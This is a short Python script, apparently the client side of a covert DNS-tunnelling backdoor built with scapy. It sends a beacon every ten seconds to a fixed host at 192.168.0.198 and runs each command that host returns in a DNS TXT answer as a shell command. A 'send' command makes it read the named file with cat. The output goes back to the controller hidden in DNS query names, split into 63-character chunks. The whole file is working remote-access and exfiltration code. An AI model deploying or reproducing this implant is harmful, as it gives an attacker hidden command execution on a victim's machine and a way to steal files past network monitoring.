#!/usr/bin/env python3
import subprocess
from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP, RandShort
import time
from threading import Thread
qname_length = 63
       
def connect():
	while True:
		KeepAlive()
		time.sleep(10)
  
        
def KeepAlive():
    packet = IP(dst="192.168.0.198")/UDP(sport=RandShort(), dport=53)/DNS(rd=1, \
            qd=DNSQR(qname="client ready", qtype="TXT", qclass="IN"))

    send(packet, verbose = False)

def handle_packet(packet):
    if DNSQR in packet and packet[DNS].qr == 1 and packet[IP].src == "192.168.0.198":
        # Received command from server
        command = packet[DNS].an.rdata[0].decode()
        if command.startswith('send'):
            command = "cat " + (command.split(" ")[-1])
            print(command)
            result = "data " + execute_command(command)
            length_check_and_send(packet, result)
        else:
            result = execute_command(command)
            length_check_and_send(packet, result)
      

def length_check_and_send(packet, result):
    if len(result) > qname_length:
    # Split the original variable into multiple variables
        num_of_vars = len(result) // qname_length + 1
        vars_list = [result[i*qname_length:(i+1)*qname_length] for i in range(num_of_vars)]

    # Print the variables
        for i, result in enumerate(vars_list):
            send_result(packet, result)
    else:
        # The original variable is shorter than 60 characters, so no need to split it
         send_result(packet, result)
         
def send_result(packet, result):
    response = IP(dst=packet[IP].src) / \
                UDP(dport=packet[UDP].sport, sport=53) / \
                DNS(id=packet[DNS].id, qr=1, aa=1, qd=DNSQR(qname=result), \
                    an=DNSRR(rrname =result, type = 'TXT'))
    
    #response.show()
    send(response, verbose = False)
    
def execute_command(command):
    # Execute command and return result
    #command = command[:-1]
    result = subprocess.check_output(command, shell=True).decode('ascii')
    return result


def main():
    connection_thread = Thread(target = connect)
    connection_thread.start()
    sniff(filter="udp port 53", prn=handle_packet)
    
if __name__ == '__main__':
    main()